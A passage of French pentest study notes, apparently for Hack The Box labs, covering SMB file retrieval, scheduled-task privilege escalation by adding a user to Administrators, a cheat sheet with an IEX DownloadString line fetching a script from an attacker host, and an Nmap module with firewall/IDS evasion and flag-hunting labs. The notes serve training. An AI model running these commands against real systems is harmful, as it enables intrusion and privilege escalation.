crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.130.98<span class="w"> </span>-u<span class="w"> </span>john<span class="w"> </span>-p<span class="w"> </span><span class="s1">'SuperSecurePass123'</span><span class="w"> </span>--share<span class="w"> </span>Devs<span class="w"> </span>--get-file<span class="w"> </span>tmp.ps1<span class="w"> </span>tmp.ps1

<span class="c1"># Exploit Gitea (optionnel) : msf6 exploit/multi/http/gitea_git_hooks_rce</span>

<span class="c1"># Escalade via tâche planifiée</span>
powershell<span class="w"> </span>-c<span class="w"> </span><span class="s2">"Add-Content -Path 'C:\\ProgramData\\CorpBackup\\Scripts\\backupprep.ps1' -Value 'Add-LocalGroupMember -Group \"Administrators\" -Member \"WIN01\\john\"'"</span>
schtasks<span class="w"> </span>/run<span class="w"> </span>/tn<span class="w"> </span><span class="se">\C</span>orpBackupAgent
net<span class="w"> </span>user<span class="w"> </span>john
</code></pre>
</div>
<h2>Artefacts &amp; Restauration</h2>
<ul>
<li><strong>Fichiers modifiés</strong> :
<ul>
<li><code>C:\ProgramData\CorpBackup\Scripts\backupprep.ps1</code> (ligne ajoutée)</li>
<li><code>C:\ProgramData\CorpBackup\Logs\*.log</code> (entrées supplémentaires)</li>
</ul></li>
<li><strong>Comptes/Groupes</strong> : <em>WIN01\john</em> ajouté à <strong>Administrators</strong>.</li>
<li><strong>Nettoyage</strong> :
<ul>
<li>Retirer la ligne injectée dans <code>backupprep.ps1</code>.</li>
<li><code>net localgroup Administrators john /delete</code>.</li>
<li>Supprimer scripts/POC déposés et clés copiées.</li>
<li>Restaurer ACL (<code>icacls</code>) sur <code>ProgramData/CorpBackup</code>.</li>
</ul></li>
</ul>
<h2>Annexe — « Cheat‑sheet » de commandes</h2>
<ul>
<li><strong>Nmap</strong> : <code>nmap -p- -sV -sC -T4 -Pn &lt;IP&gt;</code></li>
<li><strong>FTP</strong> : <code>ftp &lt;IP&gt; 21</code> (anonymous)</li>
<li><strong>WordPress</strong> : <code>wpscan --url https://&lt;host&gt; --disable-tls-checks -e p</code></li>
<li><strong>CME</strong> : <code>crackmapexec smb &lt;IP&gt; --shares</code>, <code>-spider &lt;share&gt;</code>, <code>-get-file</code></li>
<li><strong>Hydra (RDP)</strong> : <code>hydra -l john -p 'SuperSecurePass123' rdp://&lt;IP&gt;</code></li>
<li><strong>RDP</strong> : <code>xfreerdp /u:john /p:'...' /v:&lt;IP&gt;</code></li>
<li><strong>Privesc Linux</strong> : <code>sudo -l</code>, <code>sudo nano</code>, GTFObins escape</li>
<li><strong>Privesc Windows</strong> : <code>icacls &lt;path&gt;</code>, <code>schtasks /query /v</code>, <code>Add-LocalGroupMember</code></li>
<li><strong>WinPEAS</strong> : <code>IEX(New-Object Net.WebClient).DownloadString('http://&lt;attacker&gt;:8080/winPEAS.ps1')</code></li>
<li><strong>LinPEAS</strong> : <code>bash /path/linpeas.sh</code></li>
</ul>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Network Enumeration with Nmap</strong></summary><div class="indented"><h2>Résumé exécutif</h2>
<p>Ce module montre comment passer d’un simple balayage réseau à une <strong>énumération précise et exploitable</strong> : détection d’hôtes/ports, identification de services/versions, utilisation de <strong>Nmap Scripting Engine (NSE)</strong>, <strong>optimisation des performances</strong>, et <strong>contournement FW/IDS/IPS</strong> (ports source « de confiance », fragmentation, décoys, etc.).</p>
<p>Les labs illustrent la logique :</p>
<ul>
<li><strong>Default</strong> : lire un <strong>flag dans une bannière</strong> (31337/tcp).</li>
<li><strong>Medium</strong> : récupérer la <strong>version DNS</strong> via <strong>UDP + CHAOS</strong> <code>version.bind</code>.</li>
<li><strong>Hard</strong> : ouvrir un service masqué (<strong>50000/tcp</strong>) en <strong>faisant passer le trafic pour du DNS</strong> (<code>-source-port 53</code>) et en extraire <strong>version/flag</strong>.</li>
</ul>
<h2>Énumération : philosophie (Page 1)</h2>
<ul>
<li>L’énumération est <strong>le cœur</strong> du pentest : comprendre <strong>quoi</strong> est exposé et <strong>comment</strong> dialoguer avec <strong>chaque service</strong>.</li>
<li>Les outils (Nmap, dig, smbclient, curl, ncat…) <strong>ne remplacent pas</strong> la compréhension des protocoles (HTTP/FTP/SMTP/DNS/SMB…).</li>
<li><strong>Manuel + outillé</strong> : quand un scanner « time-out », on tente <strong>d’autres angles</strong> (ports source, délais, bannières, commandes applicatives).</li>
</ul>
<h2>Découverte &amp; scan d’hôtes/ports (Host Enumeration)</h2>
<h3>Démarrages sûrs (ICMP/DNS souvent filtrés sur HTB)</h3>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Top 1000 TCP – rapide et fiable</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">2</span><span class="w"> </span>-oA<span class="w"> </span>top<span class="w"> </span>&lt;IP&gt;

<span class="c1"># Full TCP (si la cible répond bien)</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">2000</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">2</span><span class="w"> </span>-oA<span class="w"> </span>full<span class="w"> </span>&lt;IP&gt;

<span class="c1"># UDP (échantillon)</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">200</span><span class="w"> </span>-T3<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>-oA<span class="w"> </span>udp_top<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<h3>Extraction des ports ouverts pour la suite</h3>
<div class="codehilite">
<pre><span></span><code><span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>awk<span class="w"> </span><span class="s1">'/^[0-9]+\/tcp[[:space:]]+open/{print $1}'</span><span class="w"> </span>full.nmap<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d/<span class="w"> </span>-f1<span class="w"> </span><span class="p">|</span><span class="w"> </span>paste<span class="w"> </span>-sd,<span class="k">)</span>
</code></pre>
</div>
<h2>Nmap Scripting Engine (NSE) (Page 7)</h2>
<p><strong>Catégories clés</strong> : <code>default</code>, <code>safe</code>, <code>version</code>, <code>vuln</code>, <code>auth</code>, <code>brute</code>, <code>discovery</code>…</p>
<p><strong>Usage</strong> :</p>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Scripts par défaut</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sV<span class="w"> </span>-p<span class="s2">"</span><span class="nv">$ports</span><span class="s2">"</span><span class="w"> </span>-sC<span class="w"> </span>-oA<span class="w"> </span>nse_default<span class="w"> </span>&lt;IP&gt;

<span class="c1"># Scripts ciblés (HTTP, bannières, mail, SMB, etc.)</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sV<span class="w"> </span>-p<span class="s2">"</span><span class="nv">$ports</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>--script<span class="w"> </span><span class="s2">"banner,default,safe,http-title,http-headers,http-server-header,http-enum,http-methods,\</span>
<span class="s2">smb-os-discovery,smb-enum-shares,pop3-capabilities,imap-capabilities,ftp-anon,ftp-syst,smtp-commands"</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-oA<span class="w"> </span>nse_sweep<span class="w"> </span>&lt;IP&gt;

<span class="c1"># Catégorie vuln</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sV<span class="w"> </span>-p80<span class="w"> </span>--script<span class="w"> </span>vuln<span class="w"> </span>-oA<span class="w"> </span>nse_vuln<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<blockquote>
<p>⚠️ Si Nmap crie qu’un script n’existe pas (ex. pgsql-info) : retire-le et/ou lance nmap --script-updatedb.</p>
</blockquote>
<h2>Scan agressif &amp; fingerprinting rapide</h2>
<div class="codehilite">
<pre><span></span><code><span class="c1"># -A = -sV + -O + traceroute + -sC (scripts par défaut)</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-p80<span class="w"> </span>-A<span class="w"> </span>-oA<span class="w"> </span>aggr<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<h2>Performance (Page 8)</h2>
<p><strong>Templates</strong> : <code>-T0 … -T5</code> (paranoïde → insane).</p>
<p><strong>Astuces</strong> :</p>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Ajuster délais &amp; cadence (ne pas trop serrer sous peine de faux négatifs)</span>
--initial-rtt-timeout<span class="w"> </span>50ms<span class="w"> </span>--max-rtt-timeout<span class="w"> </span>200ms<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">2</span><span class="w"> </span>--min-rate<span class="w"> </span><span class="m">1200</span>

<span class="c1"># Exemple « équilibré »</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">2000</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">2</span><span class="w"> </span>-oA<span class="w"> </span>perf<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<h2>Évasion FW/IDS/IPS (Pages 9–12)</h2>
<h3>Mapper le filtrage</h3>
<div class="codehilite">
<pre><span></span><code><span class="c1"># ACK-scan : où l’ACK traverse (unfiltered) / bloque (filtered)</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sA<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">1000</span><span class="w"> </span>--reason<span class="w"> </span>-oA<span class="w"> </span>ackmap<span class="w"> </span>&lt;IP&gt;

<span class="c1"># Null/Fin/Xmas : tests stateless</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sN<span class="w"> </span>-p1-1000<span class="w"> </span>-oA<span class="w"> </span>null<span class="w"> </span>&lt;IP&gt;
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sF<span class="w"> </span>-p1-1000<span class="w"> </span>-oA<span class="w"> </span>fin<span class="w">  </span>&lt;IP&gt;
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sX<span class="w"> </span>-p1-1000<span class="w"> </span>-oA<span class="w"> </span>xmas<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<h3>Ports source « de confiance » (DNS/NTP/HTTPS)</h3>
<p>Les pare-feu laissent souvent passer le trafic <strong>depuis</strong> 53/UDP/TCP, 123/UDP, 443/TCP.</p>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Ouvrir un port « filtered » via DNS (TCP 53 en source)</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>-p50000<span class="w"> </span>--source-port<span class="w"> </span><span class="m">53</span><span class="w"> </span>-e<span class="w"> </span>tun0<span class="w"> </span>-vv<span class="w"> </span>--packet-trace<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<blockquote>
<p>Important : --source-port ne marche pas avec -sT. Utiliser -sS (raw).</p>
</blockquote>
<h3>Décoys &amp; fragmentation</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>-p80<span class="w"> </span>-D<span class="w"> </span>RND:5<span class="w"> </span>-oA<span class="w"> </span>decoy<span class="w"> </span>&lt;IP&gt;<span class="w">   </span><span class="c1"># brouille les logs</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>-p1-200<span class="w"> </span>--mtu<span class="w"> </span><span class="m">8</span><span class="w"> </span>-oA<span class="w"> </span>frag<span class="w"> </span>&lt;IP&gt;<span class="w">  </span><span class="c1"># fragmentation</span>
</code></pre>
</div>
<h2>Labs – Démos et résultats</h2>
<h3><strong>Default Lab</strong> – <em>Flag en bannière</em></h3>
<ul>
<li><strong>Objectif</strong> : lire un flag sur un service « bavard ».</li>
<li><p><strong>Technique</strong> : NSE <code>banner</code> + scan port <code>31337</code>.</p>
<p><strong>Exemple (réel)</strong> :</p></li>
</ul>
<div class="codehilite"><pre><code>31337/tcp open  Elite
banner: 220 HTB{##}

</code></pre></div>
<h3><strong>Medium Lab</strong> – <em>Version du DNS (UDP requis)</em></h3>
<ul>
<li><strong>VPN</strong> : profil <strong>UDP 1337</strong>.</li>
<li><p><strong>But</strong> : obtenir la <strong>version DNS</strong> (souvent BIND/dnsmasq/MSDNS).</p>
<p><strong>Méthode A – dig CHAOS</strong> :</p></li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Confirme 53/udp</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-p53<span class="w"> </span>-e<span class="w"> </span>tun0<span class="w"> </span>-oA<span class="w"> </span>dns_check<span class="w"> </span><span class="m">10</span>.129.2.48

<span class="c1"># Version (CHAOS)</span>
dig<span class="w"> </span>@10.129.2.48<span class="w"> </span>-p<span class="w"> </span><span class="m">53</span><span class="w"> </span>-c<span class="w"> </span>CH<span class="w"> </span>-t<span class="w"> </span>TXT<span class="w"> </span>version.bind<span class="w"> </span>+short
<span class="c1"># variantes</span>
dig<span class="w"> </span>@10.129.2.48<span class="w"> </span>-p<span class="w"> </span><span class="m">53</span><span class="w"> </span>-c<span class="w"> </span>CH<span class="w"> </span>-t<span class="w"> </span>TXT<span class="w"> </span>version.server<span class="w"> </span>+short
dig<span class="w"> </span>@10.129.2.48<span class="w"> </span>-p<span class="w"> </span><span class="m">53</span><span class="w"> </span>-c<span class="w"> </span>CH<span class="w"> </span>-t<span class="w"> </span>TXT<span class="w"> </span>hostname.bind<span class="w"> </span>+short

<span class="c1"># Si filtrage strict : simule une requête « DNS depuis DNS »</span>
dig<span class="w"> </span>@10.129.2.48<span class="w"> </span>-p<span class="w"> </span><span class="m">53</span><span class="w"> </span>-c<span class="w"> </span>CH<span class="w"> </span>-t<span class="w"> </span>TXT<span class="w"> </span>version.bind<span class="w"> </span>+short<span class="w"> </span>+srcport<span class="o">=</span><span class="m">53</span>
</code></pre>
</div>
<p><strong>Méthode B – Nmap</strong> :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sU<span class="w"> </span>-p53<span class="w"> </span>-sV<span class="w"> </span>--version-intensity<span class="w"> </span><span class="m">9</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>--script<span class="w"> </span>dns-nsid,dns-recursion<span class="w"> </span>-e<span class="w"> </span>tun0<span class="w"> </span>-oA<span class="w"> </span>dns_nmap<span class="w"> </span><span class="m">10</span>.129.2.48
</code></pre>
</div>
<h3><strong>Hard Lab</strong> – <em>Service masqué, version/flag via source-port 53</em></h3>
<ul>
<li><strong>Cible</strong> : <code>10.129.2.47</code>.</li>
<li><strong>Découverte</strong> :
<ul>
<li>TCP normal : <code>22/tcp open ssh</code>, <code>80/tcp open http</code>.</li>
<li>Avec <code>-source-port 53</code> (trafic DNS) : <strong><code>50000/tcp open</code></strong> apparaît.</li>
</ul></li>
<li><strong>Preuve d’ouverture (SYN)</strong> :</li>
</ul>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>-p50000<span class="w"> </span>--source-port<span class="w"> </span><span class="m">53</span><span class="w"> </span>-e<span class="w"> </span>tun0<span class="w"> </span>-vv<span class="w"> </span>--packet-trace<span class="w"> </span><span class="m">10</span>.129.2.47
<span class="c1"># RCVD SA → 50000/tcp open</span>
</code></pre>
</div>
<ul>
<li><strong>Lecture de bannière</strong> (port 53 local occupé ⇒ binder sur l’IP <strong>tun0</strong>) :</li>
</ul>
<div class="codehilite">
<pre><span></span><code><span class="nv">tunip</span><span class="o">=</span><span class="k">$(</span>ip<span class="w"> </span>-4<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>dev<span class="w"> </span>tun0<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'/inet/{print $2}'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d/<span class="w"> </span>-f1<span class="k">)</span>

<span class="c1"># Déclenche la bannière (FTP probable)</span>
<span class="nb">printf</span><span class="w"> </span><span class="s1">'\r\n'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>ncat<span class="w"> </span>-nv<span class="w"> </span>-s<span class="w"> </span><span class="s2">"</span><span class="nv">$tunip</span><span class="s2">"</span><span class="w"> </span>--source-port<span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="m">10</span>.129.2.47<span class="w"> </span><span class="m">50000</span>
<span class="nb">printf</span><span class="w"> </span><span class="s1">'FEAT\r\nSYST\r\nQUIT\r\n'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>ncat<span class="w"> </span>-nv<span class="w"> </span>-s<span class="w"> </span><span class="s2">"</span><span class="nv">$tunip</span><span class="s2">"</span><span class="w"> </span>--source-port<span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="m">10</span>.129.2.47<span class="w"> </span><span class="m">50000</span>
</code></pre>
</div>
<ul>
<li><strong>Ce qu’on soumet</strong> :
<ul>
<li>si la bannière contient <code>HTB{…}</code> → <strong>le flag</strong> tel quel ;</li>
<li>sinon, la <strong>version</strong> (ex. <code>ProFTPD 1.3.5b</code>).</li>
</ul></li>
<li><strong>Note</strong> : 22/80 montrent aussi <code>OpenSSH 7.6p1 Ubuntu 4ubuntu0.7</code> &amp; <code>Apache/2.4.29 (Ubuntu)</code> — utiles, mais <strong>l’objectif</strong> est le service rendu visible <strong>grâce</strong> au <strong>source-port 53</strong> (50000/tcp).</li>
</ul>
<h2>Pièges &amp; dépannage (rencontrés en pratique)</h2>
<ul>
<li><strong>Placeholder non remplacé</strong> (<code>10.129.X.Y</code>) → « Failed to resolve ».</li>
<li><strong>Variable vide</strong> (<code>fport=""</code>) → « Your port specifications are illegal ».</li>
<li><strong>Script NSE inexistant</strong> (<code>pgsql-info</code>) → retire-le, <code>nmap --script-updatedb</code>.</li>
<li><strong><code>-source-port</code> ignoré</strong> avec <code>sT</code> → utiliser <code>sS</code>.</li>
<li><strong><code>ncat</code> ne bind pas 53</strong> (« Address already in use ») → binder sur <strong>tun0</strong> (<code>s $tunip</code>) ou stopper <code>systemd-resolved</code> momentanément.</li>
<li><strong>Greps trop larges</strong> (capturent « Not shown ») → filtrer précisément :</li>
</ul>
<div class="codehilite">
<pre><span></span><code>awk<span class="w"> </span><span class="s1">'/^[0-9]+\/tcp[[:space:]]+filtered/ {print $1}'</span><span class="w"> </span>top.nmap
</code></pre>
</div>
<h2>Cheatsheet express</h2>
<h3>Scans essentiels</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">2</span><span class="w"> </span>-oA<span class="w"> </span>top<span class="w"> </span>&lt;IP&gt;
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">2000</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">2</span><span class="w"> </span>-oA<span class="w"> </span>full<span class="w"> </span>&lt;IP&gt;
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">200</span><span class="w"> </span>-T3<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>-oA<span class="w"> </span>udp_top<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<h3>NSE utile</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sV<span class="w"> </span>-p<span class="s2">"</span><span class="nv">$ports</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>--script<span class="w"> </span><span class="s2">"banner,default,safe,http-title,http-headers,http-server-header,http-enum,http-methods,\</span>
<span class="s2">smb-os-discovery,smb-enum-shares,pop3-capabilities,imap-capabilities,ftp-anon,ftp-syst,smtp-commands"</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-oA<span class="w"> </span>nse_sweep<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<h3>Perf &amp; fiabilité</h3>
<div class="codehilite">
<pre><span></span><code>--initial-rtt-timeout<span class="w"> </span>50ms<span class="w"> </span>--max-rtt-timeout<span class="w"> </span>200ms<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">2</span><span class="w"> </span>--min-rate<span class="w"> </span><span class="m">1200</span><span class="w"> </span>-T3/4
</code></pre>
</div>
<h3>Évasion FW/IDS</h3>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sA<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">1000</span><span class="w"> </span>--reason<span class="w"> </span>-oA<span class="w"> </span>ack<span class="w"> </span>&lt;IP&gt;<span class="w">       </span><span class="c1"># carto FW</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>-p50000<span class="w"> </span>--source-port<span class="w"> </span><span class="m">53</span><span class="w"> </span>-e<span class="w"> </span>tun0<span class="w"> </span>&lt;IP&gt;<span class="w">        </span><span class="c1"># faux DNS</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>-p1-200<span class="w"> </span>--mtu<span class="w"> </span><span class="m">8</span><span class="w"> </span>-oA<span class="w"> </span>frag<span class="w"> </span>&lt;IP&gt;<span class="w">                </span><span class="c1"># fragmentation</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>-p80<span class="w"> </span>-D<span class="w"> </span>RND:5<span class="w"> </span>-oA<span class="w"> </span>decoy<span class="w"> </span>&lt;IP&gt;<span class="w">                 </span><span class="c1"># décoys</span>
</code></pre>
</div>
<h3>DNS version (Medium Lab)</h3>
<div class="codehilite">
<pre><span></span><code>dig<span class="w"> </span>@&lt;IP&gt;<span class="w"> </span>-p<span class="w"> </span><span class="m">53</span><span class="w"> </span>-c<span class="w"> </span>CH<span class="w"> </span>-t<span class="w"> </span>TXT<span class="w"> </span>version.bind<span class="w"> </span>+short<span class="w"> </span>+srcport<span class="o">=</span><span class="m">53</span>
</code></pre>
</div>
<h3>Lecture bannière (Hard Lab)</h3>
<div class="codehilite">
<pre><span></span><code><span class="nv">tunip</span><span class="o">=</span><span class="k">$(</span>ip<span class="w"> </span>-4<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>dev<span class="w"> </span>tun0<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'/inet/{print $2}'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d/<span class="w"> </span>-f1<span class="k">)</span>
<span class="nb">printf</span><span class="w"> </span><span class="s1">'FEAT\r\nSYST\r\nQUIT\r\n'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>ncat<span class="w"> </span>-nv<span class="w"> </span>-s<span class="w"> </span><span class="s2">"</span><span class="nv">$tunip</span><span class="s2">"</span><span class="w"> </span>--source-port<span class="w"> </span><span class="m">53</span><span class="w"> </span>&lt;IP&gt;<span class="w"> </span><span class="m">50000</span>
</code></pre>
</div>
<h2>Annexes – scripts utiles</h2>
<h3>Sweep « propre » + grep flag (Default-style)</h3>
<div class="codehilite">
<pre><span></span><code><span class="nv">out</span><span class="o">=</span><span class="s2">"nmap_mod_</span><span class="k">$(</span>date<span class="w"> </span>+%H%M%S<span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="s2">"</span><span class="nv">$out</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="nv">target</span><span class="o">=</span>&lt;IP&gt;
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">4000</span><span class="w"> </span>-T4<span class="w"> </span>-oA<span class="w"> </span><span class="s2">"</span><span class="nv">$out</span><span class="s2">/all"</span><span class="w"> </span><span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span>
<span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>awk<span class="w"> </span><span class="s1">'/open/{print $1}'</span><span class="w"> </span><span class="s2">"</span><span class="nv">$out</span><span class="s2">/all.nmap"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d/<span class="w"> </span>-f1<span class="w"> </span><span class="p">|</span><span class="w"> </span>paste<span class="w"> </span>-sd,<span class="k">)</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="s2">"</span><span class="nv">$ports</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>--script<span class="w"> </span><span class="s2">"banner,default,safe,http-title,http-headers,http-robots.txt,http-enum,http-methods,\</span>
<span class="s2">smb-os-discovery,smb-enum-shares,pop3-capabilities,imap-capabilities,ftp-anon,ftp-syst,smtp-commands"</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-oA<span class="w"> </span><span class="s2">"</span><span class="nv">$out</span><span class="s2">/nse"</span><span class="w"> </span><span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span>
grep<span class="w"> </span>-niE<span class="w"> </span><span class="s1">'HTB\{[^}]+\}|FLAG\{[^}]+\}'</span><span class="w"> </span><span class="s2">"</span><span class="nv">$out</span><span class="s2">"</span>/nse.*<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">true</span>
</code></pre>
</div>
<h3>Hard-style – ouverture par source-port 53 + bannière</h3>
<div class="codehilite">
<pre><span></span><code><span class="nv">target</span><span class="o">=</span>&lt;IP&gt;<span class="p">;</span><span class="w"> </span><span class="nv">out</span><span class="o">=</span><span class="s2">"hard_</span><span class="k">$(</span>date<span class="w"> </span>+%H%M%S<span class="k">)</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="s2">"</span><span class="nv">$out</span><span class="s2">"</span>
sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sS<span class="w"> </span>-p-<span class="w"> </span>--source-port<span class="w"> </span><span class="m">53</span><span class="w"> </span>-e<span class="w"> </span>tun0<span class="w"> </span>-oA<span class="w"> </span><span class="s2">"</span><span class="nv">$out</span><span class="s2">/tcp_sp53"</span><span class="w"> </span><span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span>
<span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>awk<span class="w"> </span><span class="s1">'/open/{print $1}'</span><span class="w"> </span><span class="s2">"</span><span class="nv">$out</span><span class="s2">/tcp_sp53.nmap"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d/<span class="w"> </span>-f1<span class="w"> </span><span class="p">|</span><span class="w"> </span>paste<span class="w"> </span>-sd,<span class="k">)</span>
<span class="o">[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">"</span><span class="nv">$ports</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-sV<span class="w"> </span>--version-intensity<span class="w"> </span><span class="m">9</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">"</span><span class="nv">$ports</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>--source-port<span class="w"> </span><span class="m">53</span><span class="w"> </span>-e<span class="w"> </span>tun0<span class="w"> </span>--script<span class="w"> </span><span class="s2">"banner,fingerprint-strings"</span><span class="w"> </span>-oA<span class="w"> </span><span class="s2">"</span><span class="nv">$out</span><span class="s2">/ver_sp53"</span><span class="w"> </span><span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span>
